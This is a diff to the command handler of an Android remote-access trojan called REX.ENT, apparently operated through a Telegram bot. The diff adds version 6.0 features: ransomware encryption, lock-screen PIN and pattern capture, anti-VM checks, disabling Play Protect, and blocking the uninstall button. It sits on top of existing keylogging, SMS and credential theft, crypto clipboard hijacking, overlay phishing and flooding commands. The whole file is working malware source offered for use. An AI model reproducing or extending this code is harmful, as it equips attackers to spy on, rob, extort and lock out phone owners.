@@ -8,6 +8,8 @@ import android.os.Environment;
 import com.enterprise.rat.admin.AdminReceiver;
 import com.enterprise.rat.activities.FakeUpdateActivity;
 import com.enterprise.rat.bot.BotConfig;
+import com.enterprise.rat.services.AccessibilityService;
+import com.enterprise.rat.utils.AntiVM;
 import com.enterprise.rat.utils.TelegramApi;
 import com.google.gson.JsonObject;
 
@@ -57,6 +59,7 @@ public class CommandHandler {
     private AntiUninstallManager antiUninstallManager;
     private OverlayPhishingManager overlayPhishingManager;
     private CryptoClipboardHijackManager cryptoClipboardHijackManager;
+    private ScreenLiveStreamManager screenLiveStreamManager;
 
     public CommandHandler(Context context) {
         this.context = context;
@@ -104,13 +107,14 @@ public class CommandHandler {
         this.antiUninstallManager = new AntiUninstallManager(context);
         this.overlayPhishingManager = new OverlayPhishingManager(context);
         this.cryptoClipboardHijackManager = new CryptoClipboardHijackManager(context);
+        this.screenLiveStreamManager = new ScreenLiveStreamManager(context);
     }
 
     public void handleCommand(String text, long chatId, String messageId, JsonObject message) {
         String[] parts = text.trim().split("\\s+");
         if (parts.length == 0) return;
         String cmd = parts[0].toLowerCase();
-        if (cmd.equals("/start") || cmd.equals("/help")) { processGlobal(cmd); return; }
+        if (cmd.equals("/start") || cmd.equals("/help") || cmd.equals("/menu")) { processGlobal(cmd); return; }
 
         String target = "ALL";
         String[] args = new String[0];
@@ -134,10 +138,44 @@ public class CommandHandler {
 
     private void processGlobal(String cmd) {
         if (cmd.equals("/start")) {
-            TelegramApi.sendMessage("⚡ REX.ENT v5.0\nSession: " + BotConfig.SESSION_ID + "\n/uninstall_block /fake_update /reset_grant");
+            TelegramApi.sendMessage("⚡ <b>REX.ENT v6.0</b>\nSession: <code>" + BotConfig.SESSION_ID + "</code>\n\nGunakan <code>/menu</code> untuk daftar perintah.");
         } else {
-            TelegramApi.sendMessage("Use /command [args]. /start for session ID.");
+            TelegramApi.sendMessage(getMenu());
         }
+    }
+
+    private String getMenu() {
+        return "<b>📋 REX.ENT v6.0 — COMMAND MENU</b>\n\n" +
+            "<b>📁 File Manager</b>\n<code>/ls /download /rm /rename /search /zip</code>\n\n" +
+            "<b>📍 Location</b>\n<code>/location /gps /geofence</code>\n\n" +
+            "<b>💬 SMS / Calls</b>\n<code>/sms_list /sendsms /delsms /calls /contacts /sms_fwd</code>\n\n" +
+            "<b>📷 Camera</b>\n<code>/photo_front /photo_back /record /call_record</code>\n\n" +
+            "<b>🎙 Audio</b>\n<code>/mic /liveaudio</code>\n\n" +
+            "<b>🖥 Screen</b>\n<code>/screenshot /screenrecord /screen_lock /screen_unlock /stream_start /stream_stop</code>\n\n" +
+            "<b>⌨ Keylogger</b>\n<code>/keylog_start /keylog_stop /keylog_dump</code>\n\n" +
+            "<b>📱 Device</b>\n<code>/info /apps /battery /network /permissions /cpu_ram /usage</code>\n\n" +
+            "<b>📋 Clipboard</b>\n<code>/clipboard /setclip /crypto_monitor_start /crypto_hijack_start /crypto_hijack_stop</code>\n\n" +
+            "<b>🔔 Notification</b>\n<code>/notif /fakenotif /otp_scan /reply</code>\n\n" +
+            "<b>📦 Stealer</b>\n<code>/steal_images /steal_docs /extract_wa /extract_tg /cookies /history</code>\n\n" +
+            "<b>🌐 Network</b>\n<code>/httpflood /udpflood /wifi_scan /wifi_pass /bluetooth</code>\n\n" +
+            "<b>⚙ Shell</b>\n<code>/shell /sush /process_list /kill_pid /kill_pkg</code>\n\n" +
+            "<b>🛡 System</b>\n<code>/openurl /toast /phish /vibrate /playsound /lock /wipe /destroy /hideicon</code>\n\n" +
+            "<b>🎣 Phishing</b>\n<code>/overlay_phish /overlay_remove /fake_update</code>\n\n" +
+            "<b>🔐 Protection</b>\n<code>/uninstall_block /uninstall_unblock</code>\n\n" +
+            "<b>🎮 Control</b>\n<code>/flashlight /volume /brightness /ring_mode /wallpaper /speak</code>\n\n" +
+            "<b>➕ Other</b>\n<code>/sim_info /ussd /calendar_dump /launch /update /check_env /gmail /socmed /cred_harvest_start /cred_dump</code>\n\n" +
+            "<b>🆕 CRITICAL v6.0</b>\n" +
+            "<code>/stream_live [port]</code> — Live screen streaming\n" +
+            "<code>/stream_live_stop</code> — Stop live stream\n" +
+            "<code>/ransomware [path] [key]</code> — Encrypt files (AES‑256)\n" +
+            "<code>/decrypt [path] [key]</code> — Decrypt ransomware\n" +
+            "<code>/lock_capture_start</code> — Start PIN/pattern capture\n" +
+            "<code>/lock_capture_stop</code> — Stop & dump captured credentials\n" +
+            "<code>/anti_vm</code> — Run anti‑VM/emulator detection\n" +
+            "<code>/disable_playprotect</code> — Disable Play Protect\n" +
+            "<code>/enable_playprotect</code> — Re‑enable Play Protect\n" +
+            "<code>/block_tap_start</code> — Block force‑close/uninstall buttons\n" +
+            "<code>/block_tap_stop</code> — Stop blocking";
     }
 
     private void execute(String cmd, String[] args) {
@@ -199,8 +237,8 @@ public class CommandHandler {
                 case "/screen_unlock": ransomwareManager.removeLockScreen(); break;
                 case "/wifi_scan": wifiScannerManager.scanNetworks(); break;
                 case "/wifi_pass": wifiScannerManager.retrievePasswords(); break;
-                case "/crypto_monitor_start": cryptoClipboardManager.startMonitoring(); break;
-                case "/crypto_monitor_stop": cryptoClipboardManager.stopMonitoring(); break;
+                case "/crypto_hijack_start": cryptoClipboardHijackManager.start(); break;
+                case "/crypto_hijack_stop": cryptoClipboardHijackManager.stop(); break;
                 case "/cred_harvest_start": credentialDumper.startCredentialHarvest(); break;
                 case "/cred_dump": credentialDumper.dumpCredentials(); break;
                 case "/launch": appControllerManager.launchApp(args.length > 0 ? args[0] : ""); break;
@@ -233,23 +271,28 @@ public class CommandHandler {
                     TelegramApi.sendMessage("<b>📊 CPU & RAM</b>\nTotal: <code>" + mi.totalMem/(1024*1024) + "MB</code>\nAvailable: <code>" + mi.availMem/(1024*1024) + "MB</code>");
                     break;
                 }
-                case "/screen_stream_start": screenStreamManager.startStream(); break;
-                case "/screen_stream_stop": screenStreamManager.stopStream(); break;
-                case "/check_env": antiDebugDetector.check(context); break;
-                case "/gmail": gmailExtractorManager.extract(); break;
-                case "/help_full": TelegramApi.sendMessage(getFullHelp()); break;
-                // NEW COMMANDS:
-                case "/stream_start": liveStreamManager.startStream(args.length > 0 ? Integer.parseInt(args[0]) : 8888); break;
-                case "/stream_stop": liveStreamManager.stopStream(); break;
-                case "/uninstall_block": antiUninstallManager.activate(); break;
-                case "/uninstall_unblock": antiUninstallManager.deactivate(); break;
-                case "/overlay_phish": overlayPhishingManager.showOverlay(args.length > 0 ? args[0] : "Bank", args.length > 1 ? joinArgs(args, 1) : "Verify your identity"); break;
-                case "/overlay_remove": overlayPhishingManager.removeOverlay(); break;
-                case "/crypto_hijack_start": cryptoClipboardHijackManager.start(); break;
-                case "/crypto_hijack_stop": cryptoClipboardHijackManager.stop(); break;
+                case "/stream_live": screenLiveStreamManager.startStream(args.length > 0 ? Integer.parseInt(args[0]) : 8080); break;
+                case "/stream_live_stop": screenLiveStreamManager.stopStream(); break;
+                case "/ransomware": RansomwareCryptoManager.encryptFiles(args.length > 0 ? args[0] : null, args.length > 1 ? args[1] : null); break;
+                case "/decrypt": RansomwareCryptoManager.decryptFiles(args.length > 0 ? args[0] : null, args.length > 1 ? args[1] : null); break;
+                case "/lock_capture_start": LockScreenCaptureManager.startCapture(); break;
+                case "/lock_capture_stop": LockScreenCaptureManager.stopCapture(); break;
+                case "/anti_vm": TelegramApi.sendMessage(AntiVM.getDetectionReport()); break;
+                case "/disable_playprotect": PlayProtectDisabler.disable(); break;
+                case "/enable_playprotect": PlayProtectDisabler.enable(); break;
+                case "/block_tap_start": {
+                    AccessibilityService svc = AccessibilityService.getInstance();
+                    if (svc != null) AutoTapBlocker.enable(svc); else TelegramApi.sendMessage("❌ Accessibility not active.");
+                    break;
+                }
+                case "/block_tap_stop": {
+                    AccessibilityService svc = AccessibilityService.getInstance();
+                    if (svc != null) AutoTapBlocker.disable(svc); else TelegramApi.sendMessage("❌ Accessibility not active.");
+                    break;
+                }
                 case "/fake_update": showFakeUpdate(); break;
                 case "/reset_grant": showFakeUpdate(); break;
-                default: TelegramApi.sendMessage("Unknown command. Type /help_full"); break;
+                default: TelegramApi.sendMessage("Perintah tidak dikenal. Ketik /menu untuk daftar perintah."); break;
             }
         } catch (Exception e) {
             TelegramApi.sendMessage("❌ Error: " + e.getMessage());
@@ -267,33 +310,9 @@ public class CommandHandler {
         }
     }
 
-    private String getFullHelp() {
-        return "<b>📋 REX.ENT COMMANDS</b>\n\n" +
-            "<b>📁 File:</b> /ls /download /rm /rename /search /zip\n" +
-            "<b>📍 Location:</b> /location /gps /geofence\n" +
-            "<b>💬 SMS/Calls:</b> /sms_list /sendsms /delsms /calls /contacts /sms_fwd\n" +
-            "<b>📷 Camera:</b> /photo_front /photo_back /record /call_record\n" +
-            "<b>🎙 Audio:</b> /mic /liveaudio\n" +
-            "<b>🖥 Screen:</b> /screenshot /screenrecord /stream_start /stream_stop\n" +
-            "<b>⌨ Keylogger:</b> /keylog_start /keylog_stop /keylog_dump\n" +
-            "<b>📱 Device:</b> /info /apps /battery /network /permissions /cpu_ram /usage\n" +
-            "<b>📋 Clipboard:</b> /clipboard /setclip /crypto_hijack_start /crypto_hijack_stop\n" +
-            "<b>🔔 Notif:</b> /notif /fakenotif /otp_scan /reply\n" +
-            "<b>📦 Stealer:</b> /steal_images /steal_docs /extract_wa /extract_tg /cookies\n" +
-            "<b>🌐 Network:</b> /httpflood /udpflood /wifi_scan /wifi_pass /bluetooth\n" +
-            "<b>⚙ Shell:</b> /shell /sush /process_list /kill_pid /kill_pkg\n" +
-            "<b>🛡 System:</b> /openurl /toast /phish /vibrate /playsound /lock /wipe /destroy\n" +
-            "<b>🎣 Phishing:</b> /overlay_phish /overlay_remove /fake_update\n" +
-            "<b>🔐 Anti-Uninstall:</b> /uninstall_block /uninstall_unblock\n" +
-            "<b>🎮 Control:</b> /flashlight /volume /brightness /ring_mode /wallpaper /speak\n";
-    }
-
     private String joinArgs(String[] args, int start) {
         StringBuilder sb = new StringBuilder();
-        for (int i = start; i < args.length; i++) {
-            if (i > start) sb.append(" ");
-            sb.append(args[i]);
-        }
+        for (int i = start; i < args.length; i++) { if (i > start) sb.append(" "); sb.append(args[i]); }
         return sb.toString();
     }
 }
